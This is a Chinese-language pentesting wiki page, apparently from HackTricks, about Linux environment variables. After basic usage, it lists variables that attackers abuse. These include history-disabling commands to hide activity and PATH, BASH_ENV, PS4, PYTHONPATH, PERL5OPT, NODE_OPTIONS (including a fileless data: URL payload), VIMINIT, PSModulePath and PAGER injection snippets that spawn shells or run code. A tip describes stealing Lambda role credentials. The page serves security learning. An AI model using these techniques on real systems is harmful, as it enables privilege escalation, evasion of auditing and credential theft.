# Linux 环境变量

{{#include ../../banners/hacktricks-training.md}}

## 全局变量

全局变量**会被**子进程继承。

你可以通过以下方式为当前会话创建一个全局变量：

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

此变量可供当前会话及其子进程访问。

你可以通过以下操作**删除**变量：

```bash
unset MYGLOBAL
```

## 本地变量

**本地变量**只能由**当前 shell/script** **访问**。

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## 列出当前变量

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` 中的内容以 **NUL 分隔**，因此通常更容易读取这些变体：

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

如果你正在继承的环境中查找 **credentials** 或 **有趣的服务配置**，也请查看 [Linux Post Exploitation](../post-exploitation/README.md)。

## 常见变量

来源：[https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)。<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** 使用的显示器。此变量通常设置为 **:0.0**，表示当前计算机上的第一个显示器。
- **EDITOR** – 用户首选的文本编辑器。
- **HISTFILESIZE** – 历史记录文件中包含的最大行数。
- **HISTSIZE** – 用户结束会话时添加到历史记录文件中的行数
- **HOME** – 你的主目录。
- **HOSTNAME** – 计算机的主机名。
- **LANG** – 当前语言。
- **MAIL** – 用户邮件 spool 的位置。通常为 **/var/spool/mail/USER**。
- **MANPATH** – 搜索手册页的目录列表。
- **OSTYPE** – 操作系统类型。
- **PS1** – bash 中的默认提示符。
- **PATH** – 存储所有包含可执行二进制文件的目录路径；只需指定文件名即可执行这些文件，而不必使用相对路径或绝对路径。
- **PWD** – 当前工作目录。
- **SHELL** – 当前命令 shell 的路径（例如，**/bin/bash**）。
- **TERM** – 当前终端类型（例如，**xterm**）。
- **TZ** – 你的时区。
- **USER** – 当前用户名。

## 对 hacking 有用的变量

并非所有变量都同样有用。从攻击者的角度来看，应优先关注会改变**搜索路径**、**启动文件**、**动态链接器行为**或**审计/日志记录**的变量。

### **HISTFILESIZE**

将此变量的**值改为 0**，这样当你**结束会话**时，**历史记录文件**（\~/.bash_history）会被**截断为 0 行**。

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

将此变量的**值改为 0**，这样命令就**不会保存在内存中的历史记录中**，也不会写回**历史记录文件**（\~/.bash_history）。

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

如果**此变量的值设置为 `ignorespace` 或 `ignoreboth`**，则任何前面加了空格的命令都不会保存到历史记录中。

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

将**history file**指向 **`/dev/null`**，或完全取消设置。与仅更改 history 大小相比，这通常更可靠。

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

进程会使用此处声明的 **proxy**，通过 **http 或 https** 连接互联网。

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`：遵循该设置的工具/协议所使用的默认 proxy。
- `no_proxy`：应直接连接的绕过列表（主机/域名/CIDR）。

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

大小写形式都可能会被使用，具体取决于工具（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

进程会信任**这些环境变量**指定的证书。这有助于让 **`curl`**、**`git`**、Python HTTP 客户端或软件包管理器等工具信任攻击者控制的 CA（例如，让拦截代理看起来合法）。

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

如果特权 wrapper/script **不使用绝对路径**执行命令，`PATH` 中**第一个由攻击者控制的目录**会优先匹配。这是 `sudo`、cron jobs、shell wrappers 和自定义 SUID helpers 中许多 **PATH hijacks** 的原理。留意 `env_keep+=PATH`、较弱的 `secure_path`，或通过名称调用 `tar`、`service`、`cp`、`python` 等命令的 wrapper。

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

若要查看滥用 `PATH` 的完整提权链，请参阅 [Linux Privilege Escalation](linux-privilege-escalation/README.md)。

### **HOME & XDG_CONFIG_HOME**

`HOME` 不只是目录引用：许多工具会自动从 `$HOME` 或 `$XDG_CONFIG_HOME` 加载 **dotfiles**、**plugins** 和 **per-user configuration**。如果特权工作流保留了这些值，那么 **config injection** 可能比二进制文件劫持更容易实现。

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

有趣的目标包括 `.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`，以及 `.terraformrc` 等工具专用文件。

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

这些变量会影响**动态链接器**：

- `LD_PRELOAD`：强制优先加载额外的共享对象。
- `LD_LIBRARY_PATH`：将库搜索目录置于搜索路径前列。
- `LD_AUDIT`：加载用于监视库加载和符号解析的审计库。

如果特权命令会保留这些变量，它们对于 **hooking**、**instrumentation** 和 **privilege escalation** 极具价值。在 **secure-execution** 模式下（`AT_SECURE`，例如 setuid/setgid/capabilities），加载器会移除或限制其中许多变量。不过，早期加载器阶段的解析器漏洞仍会造成重大影响，因为它们会在目标程序运行**之前**执行。<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` 会改变 glibc 的早期行为（例如 allocator tunables），在 exploit labs 中非常实用。从安全角度来看，它也很重要，因为**动态加载器会很早就解析它**。2023 年的 **Looney Tunables** 漏洞提醒我们，在加载器中解析的单个环境变量就可能成为针对 SUID 程序的**本地提权原语**。<sup>[[6]](#references)</sup>

对于 CVE-2023-4911，请将**已安装的发行版软件包版本**与其供应商修复后的版本进行比较，并确认新进程实际使用的加载器。仅凭上游版本字符串并不可靠：Debian 将受影响的解析器回移植到了其 2.31 软件包中，而有些发行版回移植了修复，却没有更改上游版本号。要实际完成权限转换，还需要一个可执行的特权目标，且其身份变更未被 `NoNewPrivs`、`nosuid` 挂载或其他缓解措施阻止。进行被动枚举时，避免运行格式错误的 `GLIBC_TUNABLES` 崩溃探测。请参阅 [Ubuntu 跟踪页面](https://ubuntu.com/security/CVE-2023-4911)、[Debian 跟踪页面](https://security-tracker.debian.org/tracker/CVE-2023-4911) 和 [Red Hat 公告](https://access.redhat.com/security/cve/cve-2023-4911)，了解各版本的适用情况；Ubuntu 的[安全通知](https://ubuntu.com/security/notices/USN-6409-1)还要求更新后重启。

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

如果以**非交互式**方式启动 **Bash**，它会检查 `BASH_ENV`，并在运行目标脚本前加载该文件。当 Bash 以 `sh` 的名称调用，或处于 POSIX 风格的交互模式时，也可能会读取 `ENV`。如果环境由攻击者控制，这是将 shell 包装器转变为代码执行入口的经典方法。

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash 会在 **real/effective IDs 不同**时忽略这些启动文件；`-p` 会保留 effective ID，但不会启用这些启动文件，因此具体行为取决于 wrapper 如何调用 shell。在启动 Bash **之前**调用 `setuid()`/`setgid()` 的特权 wrapper 需要格外小心：ID 再次匹配后，Bash 可能会信任 `BASH_ENV`、`ENV` 及相关 shell 状态，而这些内容在其他情况下会被忽略。<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

启用 **xtrace** 时，Bash 会展开 `PS4`，并在每条被跟踪的命令前打印它。`PS4` 的展开方式与提示符相同，因此其中的 **command substitution** 会被执行。关键在于，仅通过导出环境变量 `SHELLOPTS=xtrace` 就能启用 xtrace——无需在命令行中使用 `-x`——因此受害者运行的任何 Bash 脚本都会导致 code execution。<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` 在 xtrace 启用之前不会起作用（`SHELLOPTS=xtrace`、`set -x` 或 `bash -x`）；在特权/setuid 上下文中，Bash 会像处理 `BASH_ENV` 一样丢弃 `SHELLOPTS`。

### **PYTHONPATH、PYTHONHOME、PYTHONSTARTUP、PYTHONINSPECT 和 PYTHONBREAKPOINT**

这些变量会改变 Python 的启动方式：

- `PYTHONPATH`：将导入搜索路径置于最前面。
- `PYTHONHOME`：更改标准库目录树的位置。
- `PYTHONSTARTUP`：在交互式提示符出现前执行一个文件。
- `PYTHONINSPECT=1`：脚本结束后进入交互模式。
- `PYTHONBREAKPOINT`：代码执行到 `breakpoint()` 时调用 `package.module.callable`（并导入其模块）。<sup>[[8]](#references)</sup>

如果维护脚本、debugger、shell 和 wrapper 在调用 Python 时使用了可控环境变量，这些变量就很有用。`python -E` 和 `python -I` 会忽略所有 `PYTHON*` 变量。

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

一个近期的真实案例是 2024 年 Ubuntu/Debian 系统上的 **needrestart** LPE：由 root 拥有的扫描器从 `/proc/<PID>/environ` 复制了非特权进程的 `PYTHONPATH`，然后执行 Python。公开的 exploit 在攻击者可控的路径中放置了 `importlib/__init__.so`，因此 Python 会在自身初始化期间执行攻击者代码，甚至早于 helper 中硬编码脚本发挥作用。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl 也有同样实用的启动变量：

- `PERL5LIB`：将库目录置于搜索路径前端。
- `PERL5OPT`：注入开关，效果等同于这些开关出现在每条 `perl` 命令行中。

这些变量可以强制执行**自动模块加载**，或在目标脚本执行任何有意义的操作之前改变解释器行为。Perl 在 **taint / setuid / setgid** 上下文中会忽略这些变量，但它们对普通的 root 运行包装器、CI 作业、安装程序和自定义 sudoers 规则仍然很重要。

如果某条 sudo 规则允许覆盖环境变量，且其特权命令最终会启动 Perl，也要检查 `PERL5DB`。Perl 文档说明，`PERL5OPT=-d` 会启动调试器，而当 Perl 以单独的 `-d` 开关启动时，`PERL5DB` 会提供调试器初始化代码。只取消设置 `PERL5LIB` 和 `PERLLIB` 并不能移除这条路径。这些变量必须能够通过 sudo 和包装器传递，且 Perl 进程不能因 taint 或 set-ID 处理而忽略它们；枚举时应检查具体规则和执行链，不要运行特权 helper。参见 [perlrun 的环境变量参考](https://perldoc.perl.org/perlrun#ENVIRONMENT)。

即使没有保留环境变量，Perl 内置的 [`@INC` 搜索路径](https://perldoc.perl.org/perlvar#@INC) 也是另一个模块信任边界。对于特权 Perl 进程，应将实际的 `use` 或 `require` 语句与解析出的模块名称、搜索顺序，以及低权限用户能否在搜索目录下创建或替换该模块关联起来。仅有一个可写的库目录，并不能证明特权进程会从中加载代码。

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` 会将 **Node.js CLI flags** 添加到每个继承该环境变量的 `node` 进程的参数开头。因此，当 wrapper、CI job、Electron helper 和 sudo 规则最终调用 Node 时，这个变量就很有用。攻击场景中最值得关注的 flags 通常是：

- `--require <file>`：在目标脚本运行前预加载 CommonJS 文件。
- `--import <module>`：在目标脚本运行前预加载 ES module。

Node 会拒绝在 `NODE_OPTIONS` 中使用某些危险 flags，但明确允许 `--require` 和 `--import`，并且会在常规命令行参数之前处理它们。<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### 使用 `data:` URL 进行无文件 preload

当你可以设置 `NODE_OPTIONS`，但**无法在目标上写入文件**（只读文件系统、受限 API、serverless runtime 等）时，`--import` 接受 `data:text/javascript,` URL，因此整个 payload 都包含在环境变量本身中。JavaScript 必须**完全进行 URL 编码**——Node 会将该值解析为 URL，因此任何未编码的空格（或其他字符）都会截断 payload 并抛出 `SyntaxError`。这适用于 Node 20.6+，此版本中 `--import` 位于 `NODE_OPTIONS` allowlist 上。<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> 这是在 **托管云运行时** 中将 `NODE_OPTIONS` 控制权转化为 RCE 的常见方式，这类运行时的函数使用 Node。例如，攻击者如果只能修改 Lambda 的配置（`lambda:UpdateFunctionConfiguration`，没有 `iam:PassRole`，也不能更新代码），就可以注入 `NODE_OPTIONS=--import data:text/javascript,<payload>`，在函数内部运行代码并窃取其执行角色凭证。注入的模块会在 handler 之前运行，之后 handler 仍会正常执行。

对于间接设置 `NODE_OPTIONS` 的远程 gadget chain（例如通过 prototype pollution 实现 RCE），请参阅[此页面](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)。

### **RUBYLIB & RUBYOPT**

Ruby 也存在同类的启动阶段滥用方式：

- `RUBYLIB`：将目录添加到 Ruby 的加载路径前面。
- `RUBYOPT`：向每次 `ruby` 调用注入命令行选项，例如 `-r`。

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024 年的 **needrestart** 漏洞表明，这不只是实验室中的技巧：同一个易受 `PYTHONPATH` 滥用的 root 所有 helper，也可以被诱导使用攻击者控制的 `RUBYLIB` 运行 Ruby，并从攻击者目录加载 `enc/encdb.so`。<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim 会在正常启动期间执行 `VIMINIT`（或其后备变量 `EXINIT`）中包含的 Ex 命令。Ex 命令包括 `:!cmd` 和 `:call system(...)`，因此只要控制这个变量，就能在受害者每次打开 Vim 时执行代码（例如以 root 身份运行 `sudo vim`、`crontab -e`、`visudo`，或由 `git`/`less` 启动 `$EDITOR` 等）。<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode（`vim -es`/`-Es`）会跳过这些变量，但正常的交互式启动会运行它们。

### **PowerShell (pwsh): PSModulePath、DOTNET_STARTUP_HOOKS 与 CLR profiler**

PowerShell Core（`pwsh`）可运行于 Linux/macOS（以及 Windows），并且是一个 **.NET 应用程序**，因此，若继承的环境中存在若干环境变量，任何 `pwsh` 调用都可能导致代码执行——这对攻击会调用 `pwsh` 的 cron/systemd 任务、CI runners 和特权 wrappers 很有用。

- `PSModulePath`：PowerShell 会递归搜索此列表中的每个目录，查找 `.psd1`/`.psm1` modules，并在首次引用其导出命令时**自动加载**其中一个。将一个目录置于列表前面，就能让你的 module 的顶层代码在导入时运行；由于解析顺序为 *Alias → Function → Cmdlet*，导出的 function 甚至可以覆盖受害者调用的内置 cmdlet。<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`：重定向 `powershell/Microsoft.PowerShell_profile.ps1` 的位置；该文件会在启动时执行（除非使用 `-NoProfile`）。
- `DOTNET_STARTUP_HOOKS`：指定一个 managed assembly，其 `StartupHook.Initialize()` 会在 `Main` 之前运行（所有 .NET 应用共用）。
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`：CLR profiling API 会在进程启动时将攻击者的 library 加载到进程中（路径变量优先于 registry；`DOTNET_*` 是较新的别名）。在 Windows PowerShell 5.1（.NET Framework）中，使用 `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`。MITRE ATT&CK T1574.012。<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

在 Windows 上，`PSExecutionPolicyPreference=Bypass` 还会移除“阻止未签名脚本”的防护措施，使植入的 profile/module 确实运行。完整 PoC 请参阅专门页面：

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER、MANPAGER、GIT_PAGER、GIT_EDITOR 与 LESSOPEN**

有些工具不只是从环境中读取路径；它们还会将值传递给 **shell**、**编辑器**或**输入预处理器**。因此，当特权 wrapper 运行 `git`、`man`、`less` 或类似的文本查看器时，以下变量尤其值得关注：

- `PAGER`、`MANPAGER`、`GIT_PAGER`：选择 pager 命令。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`：选择编辑器命令，通常还会带参数。
- `LESSOPEN`、`LESSCLOSE`：定义在 `less` 打开文件时运行的前置/后置处理器。

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git 还支持通过 `GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>` 和 `GIT_CONFIG_VALUE_<n>` 实现**仅通过环境变量注入配置**，无需写入磁盘：

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

从 post-exploitation 的角度来看，也要记住，继承的环境变量通常包含**凭据**、**代理设置**、**服务令牌**或 **cloud keys**。查看 [Linux Post Exploitation](../post-exploitation/README.md)，了解如何搜索 `/proc/<PID>/environ` 和 `systemd` 的 `Environment=`。

### PS1

更改提示符的显示方式。

[**示例**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root 用户：

![PERL5OPT & PERL5LIB - PS1：示例](<../images/image (897).png>)

普通用户：

![PERL5OPT & PERL5LIB - PS1：一个、两个和三个后台作业](<../images/image (740).png>)

一个、两个和三个后台作业：

![PERL5OPT & PERL5LIB - PS1：一个、两个和三个后台作业](<../images/image (145).png>)

一个后台作业、一个已停止的作业，且上一条命令未能正确完成：

![PERL5OPT & PERL5LIB - PS1：一个后台作业、一个已停止的作业，且上一条命令未能正确完成](<../images/image (715).png>)

## References

- [1] [GNU Bash 手册 - Bash 启动文件](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart 中的 LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI 文档 - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [常见环境变量 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911：Looney Tunables - glibc 的 ld.so 中的本地权限提升 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash 手册 - Bash 变量（`PS4`）与 Set 内置命令（`xtrace`/`SHELLOPTS`）](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 内置的 breakpoint() 和 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim 文档 - starting.txt（`VIMINIT`、`EXINIT`）](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath 与 PowerShell 模块自动加载](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET 调试与分析器配置设置（`CORECLR_`/`DOTNET_`/`COR_` 分析器变量）](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
